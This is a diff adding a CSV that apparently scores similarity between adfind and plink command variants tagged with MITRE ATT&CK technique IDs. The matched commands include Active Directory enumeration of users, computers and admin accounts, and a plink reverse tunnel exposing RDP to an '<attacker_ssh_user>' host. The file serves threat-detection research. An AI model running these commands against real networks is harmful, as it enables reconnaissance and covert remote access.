@@ -1,0 +1,8 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_adfind_TA0007_T1018.txt,adfind,adfind -sc msDS-Behavior-Version,"adfind -f ""(objectcategory=group)""`",20.622,True
+command_adfind_TA0007_T1018.txt,adfind,"adfind -sitenamedc -b dc=<domain_name>,dc=net -f ""objectclass=*""",`adfind.exe -subnets -f (objectcategory=subnet) > ad_subnets.txt`,22.139,True
+command_adfind_TA0007_T1018.txt,adfind,"adfind -sc sl:msds* -b dc=<domain_name>,dc=net -f ""objectcategory=computer""",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,41.215,True
+command_adfind_TA0007_T1018.txt,adfind,"adfind -sc admincountdmp -b dc=<domain_name>,dc=net -f ""adminCount=1"" -jsdenl ""!m/(NT AUTHORITY|BUILTIN)/i""",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,11.331,True
+command_adfind_TA0007_T1018.txt,adfind,adfind -s schdc -sc msDS-RevealedUsers,`adfind.exe -f (objectcategory=person) > ad_users.txt`,18.508,True
+command_plink_TA0011_T1572.txt,plink,plink -sshlog <log_file> -L <listen_ip>:<listen_port>:<remote_host>:<remote_port>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",14.33,True
+command_plink_TA0011_T1572.txt,plink,plink -R <listen_ip>:<listen_port>:localhost:<local_port>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",25.112,True
